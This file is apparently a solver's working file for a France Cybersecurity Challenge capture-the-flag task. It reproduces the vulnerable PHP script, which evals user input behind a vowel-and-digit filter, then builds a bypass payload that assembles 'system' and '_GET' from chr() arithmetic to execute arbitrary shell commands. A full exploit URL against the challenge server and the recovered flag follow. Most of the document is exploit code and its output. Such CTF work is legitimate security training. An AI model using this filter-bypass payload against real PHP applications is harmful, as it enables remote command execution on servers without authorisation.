<?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
var_dump($code);
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away! Parse error');
            }
        }
    } else {
        show_source(__FILE__);
    }


foreach(get_defined_functions() as $fcts) {
    foreach ($fcts as $fctname) {
        if (!preg_match('/a|e|i|o|u|y|[0-9]/i', $fctname)) {
            echo htmlentities($fctname) . "\n";
        }
    }
}
echo '<br>';
/*
    foreach ($GLOBALS as $fctname) {
        if (!preg_match('/a|e|i|o|u|y|[0-9]/i', $fctname)) {
            echo htmlentities($fctname) . "<br/>\n";
        }
    }
*/

/*
print(ord('y')); 121
print(ord('e')); 101
print(ord('E')); 69
*/

$b='xxxxxxxxxxb';$c=strspn($b,'x');$d=!strcmp('','');$f=$c+$d;$x="s".chr($f*$f)."st".chr($c*$c+$d)."m";$g="_G".chr($c*$c-$c-$c-$c-$d)."T";$x($$g['s']);
var_dump(array($b, $c, $d, $f, $g, $x));
echo "<br>\n";

?>
<form action="source.php" method="GET">
<input name="code" type="text">
<input name="s" type="text" value="id">
<input type="submit">
</form>

view-source:http://challenges2.france-cybersecurity-challenge.fr:5008/?code=%24b%3D%27xxxxxxxxxxb%27%3B%24c%3Dstrspn%28%24b%2C%27x%27%29%3B%24d%3D%21strcmp%28%27%27%2C%27%27%29%3B%24f%3D%24c%2B%24d%3B%24x%3D%22s%22.chr%28%24f*%24f%29.%22st%22.chr%28%24c*%24c%2B%24d%29.%22m%22%3B%24g%3D%22_G%22.chr%28%24c*%24c-%24c-%24c-%24c-%24d%29.%22T%22%3B%24x%28%24%24g%5B%27s%27%5D%29%3B&s=find%20/%20-name%20*flag*

/var/www/html/.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php

<?php
	// Well done!! Here is the flag:
	// FCSC{53d195522a15aa0ce67954dc1de7c5063174a721ee5aa924a4b9b15ba1ab6948}
